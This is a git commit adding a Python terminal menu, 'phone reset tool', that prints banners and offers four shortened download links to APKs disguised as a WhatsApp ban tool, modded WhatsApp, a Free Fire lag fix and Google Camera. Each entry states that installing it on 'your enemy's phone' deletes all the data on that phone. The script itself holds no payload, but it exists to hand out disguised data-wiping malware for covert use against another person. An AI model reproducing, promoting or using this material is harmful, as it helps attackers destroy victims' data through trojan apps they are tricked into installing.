8d26c5bb6e9a759cf989490d36122c5e174c0d9b
Programmer Thavee <94915523+thavee999@users.noreply.github.com>
2024-07-19 13:00:16 +0530

    Create start.py

---
+++ start.py
@@ -0,0 +1,256 @@
+import sys,time,os
+import webbrowser
+import os
+
+#Rathu = '\033[1;31m' 
+#Kola = '\033[1;32m'
+#Kaha = '\033[1;33m'
+#Nil   = '\033[1;34m'
+#Dam   = '\033[1;35m'
+#LaNil = '\033[1;36m'
+#SUDU  = '\033[1;37m'
+#Alu   = '\033[90m'
+
+def type(tex):
+	for char in (tex):
+		sys.stdout.write(char)
+		sys.stdout.flush()
+		time.sleep(0.04)
+
+def ban(text):
+	for char in (text):
+		sys.stdout.write(char)
+		sys.stdout.flush()
+		time.sleep(0.005)		
+		
+os.system('clear')	
+		
+def main():				
+	type(
+		"  \033[1;31m       >>>> Welcome to phone reset tool <<<< \n"
+		"         \033[1;32m           Programmer Thavee\n"
+		"\n"
+		"\n"
+		"       \033[1;35m            [1] Start \n"
+		"   \033[1;35m                [2] Update now \n "
+		"      \033[1;35m            [3] More tools \n"
+		"       \033[1;35m            [4] Exit  \n"
+	)
+
+ban(
+	"   \033[1;32m      ____  _                     \n   "
+	"   \033[1;36m  |  _ \| |__   ___  _ __   ___   \n"
+	"        | |_) | '_ \ / _ \| '_ \ / _ \  \n"
+	"   \033[1;34m     |  __/| | | | (_) | | | |  __/ \n "
+	"  \033[1;31m     |_|   |_| |_|\___/|_| |_|\___| \033[1;32m   _  \n"
+	"    \033[1;32m                   _ __ ___  ___  ___| |_ \n"
+	"   \033[1;36m                   | '__/ _ \/ __|/ _ \ __|\n"
+	"    \033[1;34m                  | | |  __/\__ \  __/ |_ \n"
+	"      \033[1;31m                |_|  \___||___/\___|\__|\n"
+)
+
+print ()
+print()
+
+main()
+
+print()
+print()
+
+choise = int(input("\033[1;31mSelect your option >>>>>>>>"))	
+
+os.system('clear')
+
+ban(
+	"   \033[1;32m      ____  _                     \n   "
+	"   \033[1;36m  |  _ \| |__   ___  _ __   ___   \n"
+	"        | |_) | '_ \ / _ \| '_ \ / _ \  \n"
+	"   \033[1;34m     |  __/| | | | (_) | | | |  __/ \n "
+	"  \033[1;31m     |_|   |_| |_|\___/|_| |_|\___| \033[1;32m   _  \n"
+	"    \033[1;32m                   _ __ ___  ___  ___| |_ \n"
+	"   \033[1;36m                   | '__/ _ \/ __|/ _ \ __|\n"
+	"    \033[1;34m                  | | |  __/\__ \  __/ |_ \n"
+	"      \033[1;31m                |_|  \___||___/\___|\__|\n"
+)
+
+print()
+print()
+
+def start():
+	type(
+		"   \033[1;31m      >>>> Welcome to phone reset tool <<<< \n"
+		"    \033[1;32m                Programmer Thavee\n"
+		"\n"
+		"\n"
+		"  \033[1;35m                [1] Whatsapp Number banned\n"
+		"     \033[1;35m             [2] Mod whatsapp \n"
+		"     \033[1;35m             [3] Free fire lag fix \n"
+		"      \033[1;35m            [4] Google camera \n"
+	)		
+		
+
+
+def update():
+	type(
+		"\n"
+		">>>> No update available. <<<<"
+		"\n"
+		"\n"
+	)
+
+def tool():
+	webbrowser.open_new_tab('https://github.com/thavee999' )
+
+if choise==1:
+	start()
+elif choise==2:
+	update()
+elif choise==3:
+	tool()
+elif choise==4:
+	pass
+
+print()
+print()
+
+choose=int(input("\033[1;31mSelect your option >>>>>>>>"))
+
+os.system('clear')
+
+def banned():
+	ban(
+	"   \033[1;32m      ____  _                     \n   "
+	"   \033[1;36m  |  _ \| |__   ___  _ __   ___   \n"
+	"        | |_) | '_ \ / _ \| '_ \ / _ \  \n"
+	"   \033[1;34m     |  __/| | | | (_) | | | |  __/ \n "
+	"  \033[1;31m     |_|   |_| |_|\___/|_| |_|\___| \033[1;32m   _  \n"
+	"    \033[1;32m                   _ __ ___  ___  ___| |_ \n"
+	"   \033[1;36m                   | '__/ _ \/ __|/ _ \ __|\n"
+	"    \033[1;34m                  | | |  __/\__ \  __/ |_ \n"
+	"      \033[1;31m                |_|  \___||___/\___|\__|\n"
+	"\n"
+	"\n"
+)
+	type(
+		"  \033[1;31m       >>>> Welcome to phone reset tool <<<< \n"
+		"  \033[1;32m                 Programmer Thavee\n"
+		"\n"
+		"\n"
+		"    \033[1;34m     ***  Fake whatsapp number banned apk ***\n"
+		"\n"
+		"\n"
+		"\n"
+		"\033[1;36mAfter installing this on your enemy's phone, all the \n         data on his phone will be deleted\n"
+		"\n"
+		"\n"
+		"\033[1;32mLink :-\033[90m https://shorturl.at/w8fH5 \n"
+		"\n"
+		"\n"
+		"\033[1;31m[Copy this link and paste your web browser]\n"
+	)
+	
+def wamod():
+	ban(
+	"   \033[1;32m      ____  _                     \n   "
+	"   \033[1;36m  |  _ \| |__   ___  _ __   ___   \n"
+	"        | |_) | '_ \ / _ \| '_ \ / _ \  \n"
+	"   \033[1;34m     |  __/| | | | (_) | | | |  __/ \n "
+	"  \033[1;31m     |_|   |_| |_|\___/|_| |_|\___| \033[1;32m   _  \n"
+	"    \033[1;32m                   _ __ ___  ___  ___| |_ \n"
+	"   \033[1;36m                   | '__/ _ \/ __|/ _ \ __|\n"
+	"    \033[1;34m                  | | |  __/\__ \  __/ |_ \n"
+	"      \033[1;31m                |_|  \___||___/\___|\__|\n"
+	"\n"
+	"\n"
+)
+	type(
+		"  \033[1;31m       >>>> Welcome to phone reset tool <<<< \n"
+		"  \033[1;32m                 Programmer Thavee\n"
+		"\n"
+		"\n"
+		"     \033[1;34m        *** Fake Moded whatsapp apk ***\n"
+		"\n"
+		"\n"
+		"\n"
+		"\033[1;36mAfter installing this on your enemy's phone, all the \n         data on his phone will be deleted\n"
+		"\n"
+		"\n"
+		"\033[1;32mLink :-\033[90m https://shorturl.at/Kb1YR \n"
+		"\n"
+		"\n"
+		"\033[1;31m[Copy this link and paste your web browser]\n"
+	)
+	
+def fflagfix():
+	ban(
+	"   \033[1;32m      ____  _                     \n   "
+	"   \033[1;36m  |  _ \| |__   ___  _ __   ___   \n"
+	"        | |_) | '_ \ / _ \| '_ \ / _ \  \n"
+	"   \033[1;34m     |  __/| | | | (_) | | | |  __/ \n "
+	"  \033[1;31m     |_|   |_| |_|\___/|_| |_|\___| \033[1;32m   _  \n"
+	"    \033[1;32m                   _ __ ___  ___  ___| |_ \n"
+	"   \033[1;36m                   | '__/ _ \/ __|/ _ \ __|\n"
+	"    \033[1;34m                  | | |  __/\__ \  __/ |_ \n"
+	"      \033[1;31m                |_|  \___||___/\___|\__|\n"
+	"\n"
+	"\n"
+)
+	type(
+		"   \033[1;31m      >>>> Welcome to phone reset tool <<<< \n"
+		"     \033[1;32m              Programmer Thavee\n"
+		"\n"
+		"\n"
+		"   \033[1;34m        *** Fake Freefire lag fix apk ***\n"
+		"\n"
+		"\n"
+		"\n"
+		"\033[1;36mAfter installing this on your enemy's phone, all the \n         data on his phone will be deleted\n"
+		"\n"
+		"\n"
+		"\033[1;32mLink :-\033[90m https://shorturl.at/lwdEI \n"
+		"\n"
+		"\n"
+		"\033[1;31m[Copy this link and paste your web browser]\n"
+	)
+	
+def gcam():
+	ban(
+	"   \033[1;32m      ____  _                     \n   "
+	"   \033[1;36m  |  _ \| |__   ___  _ __   ___   \n"
+	"        | |_) | '_ \ / _ \| '_ \ / _ \  \n"
+	"   \033[1;34m     |  __/| | | | (_) | | | |  __/ \n "
+	"  \033[1;31m     |_|   |_| |_|\___/|_| |_|\___| \033[1;32m   _  \n"
+	"    \033[1;32m                   _ __ ___  ___  ___| |_ \n"
+	"   \033[1;36m                   | '__/ _ \/ __|/ _ \ __|\n"
+	"    \033[1;34m                  | | |  __/\__ \  __/ |_ \n"
+	"      \033[1;31m                |_|  \___||___/\___|\__|\n"
+	"\n"
+	"\n"
+)
+	type(
+		"    \033[1;31m     >>>> Welcome to phone reset tool <<<< \n"
+		"  \033[1;32m                 Programmer Thavee\n"
+		"\n"
+		"\n"
+		"    \033[1;34m        *** Fake Google camera apk ***\n"
+		"\n"
+		"\n"
+		"\n"
+		"\033[1;36mAfter installing this on your enemy's phone, all the \n         data on his phone will be deleted\n"
+		"\n"
+		"\n"
+		"\033[1;32mLink :-\033[90m https://shorturl.at/4Xzhm \n"
+		"\n"
+		"\n"
+		"\033[1;31m[Copy this link and paste your web browser]\n"
+	)
+	
+	
+if choose==1:
+	banned()
+elif choose==2:
+	wamod()
+elif choose==3:
+	fflagfix()
+elif choose==4:
+	gcam()												
